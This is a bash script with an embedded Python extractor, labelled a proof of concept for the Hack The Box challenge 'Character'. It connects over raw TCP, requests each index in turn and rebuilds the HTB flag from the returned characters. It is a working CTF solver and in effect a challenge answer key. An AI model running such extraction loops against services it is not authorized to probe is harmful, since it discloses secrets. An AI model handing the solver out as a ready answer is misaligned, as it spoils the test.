#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Character
# Type: Incremental secret disclosure (one character per index request)
# Transport: Raw TCP
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=8
readonly DEFAULT_MAX_INDEX=500

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
MAX_INDEX="${DEFAULT_MAX_INDEX}"
VERBOSE=0
JSON_OUTPUT=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>          Target host or IP address
  --port <port>          Target TCP port
  --timeout <seconds>    Socket timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --max-index <n>        Maximum index attempts (default: ${DEFAULT_MAX_INDEX})
  --json                 Print result as JSON
  --verbose              Enable verbose debug output
  -h, --help             Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity failure
  4  Protocol parse failure
  5  No HTB flag pattern detected
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

validate_port() {
  if ! [[ "${PORT}" =~ ^[0-9]+$ ]]; then
    log_error "Port must be numeric: ${PORT}"
    exit 2
  fi
  if (( PORT < 1 || PORT > 65535 )); then
    log_error "Port out of range (1-65535): ${PORT}"
    exit 2
  fi
}

validate_max_index() {
  if ! [[ "${MAX_INDEX}" =~ ^[0-9]+$ ]]; then
    log_error "max-index must be numeric: ${MAX_INDEX}"
    exit 2
  fi
  if (( MAX_INDEX < 1 )); then
    log_error "max-index must be >= 1"
    exit 2
  fi
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --max-index)
        MAX_INDEX="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi
}

main() {
  parse_args "$@"
  validate_port
  validate_max_index

  log_info "Target: ${HOST}:${PORT}"
  log_info "Extracting flag character-by-character..."

  local output
  if ! output="$(python3 - "${HOST}" "${PORT}" "${TIMEOUT}" "${MAX_INDEX}" "${VERBOSE}" <<'PY'
import json
import re
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])
max_index = int(sys.argv[4])
verbose = sys.argv[5] == "1"

try:
    sock = socket.create_connection((host, port), timeout=timeout)
except OSError as exc:
    print(f"ERR_CONNECT:{exc}")
    sys.exit(3)

sock.settimeout(timeout)

try:
    try:
        banner = sock.recv(4096).decode("latin1", "replace")
    except socket.timeout:
        banner = ""
    if verbose:
        print(f"DBG_BANNER:{banner!r}")

    chars = []

    for idx in range(max_index):
        sock.sendall(f"{idx}\n".encode())
        out = ""

        for _ in range(8):
            try:
                chunk = sock.recv(4096).decode("latin1", "replace")
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk

            if "Index out of range" in out:
                break
            if f"Character at Index {idx}:" in out:
                sock.settimeout(0.12)
                try:
                    out += sock.recv(4096).decode("latin1", "replace")
                except Exception:
                    pass
                finally:
                    sock.settimeout(timeout)
                break

        if "Index out of range" in out:
            break

        m = re.search(rf"Character at Index {idx}: (.)", out)
        if not m:
            try:
                out += sock.recv(4096).decode("latin1", "replace")
            except Exception:
                pass
            m = re.search(rf"Character at Index {idx}: (.)", out)

        if not m:
            print(f"ERR_PARSE:{idx}:{out!r}")
            sys.exit(4)

        chars.append(m.group(1))
        if verbose:
            print(f"DBG_IDX:{idx}:{m.group(1)!r}")

    flag = "".join(chars)
    if not re.search(r"HTB\{[^}]+\}", flag):
        print(f"ERR_NOFLAG:{flag}")
        sys.exit(5)

    print(f"OK_FLAG:{flag}")
finally:
    try:
        sock.close()
    except Exception:
        pass
PY
)"; then
    case "$?" in
      3) log_error "Could not connect to target."; exit 3 ;;
      4) log_error "Failed to parse service response."; exit 4 ;;
      5) log_error "Extraction completed but HTB pattern was not found."; exit 5 ;;
      *) log_error "Unexpected extractor failure."; exit 1 ;;
    esac
  fi

  log_debug "Extractor output: ${output}"
  local flag
  flag="$(printf '%s\n' "${output}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"

  if [[ -z "${flag}" ]]; then
    log_error "No flag extracted."
    exit 5
  fi

  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"%s:%s","flag":"%s"}\n' "${HOST}" "${PORT}" "${flag}"
  else
    log_ok "Flag extracted successfully."
    printf '%s\n' "${flag}"
  fi
}

main "$@"
